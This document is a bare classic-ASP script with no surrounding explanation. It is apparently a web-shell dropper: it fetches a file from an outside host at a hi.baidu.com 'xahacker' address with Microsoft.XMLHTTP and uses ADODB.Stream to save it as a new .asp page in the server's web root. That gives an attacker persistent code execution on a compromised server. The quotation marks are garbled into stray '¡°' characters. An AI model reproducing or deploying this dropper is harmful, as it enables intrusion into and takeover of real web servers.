<%
Set xPost = CreateObject(¡°Microsoft.XMLHTTP¡±)
xPost.Open ¡°GET¡±,¡±http://hi.baidu.com/xahacker/fuck.txt¡±,False
xPost.Send()
Set sGet = CreateObject(¡°ADODB.Stream¡±)
sGet.Mode = 3
sGet.Type = 1
sGet.Open()
sGet.Write(xPost.responseBody)
sGet.SaveToFile Server.MapPath(¡°fuck.asp¡±),2
set sGet = nothing
set sPOST = nothing
%>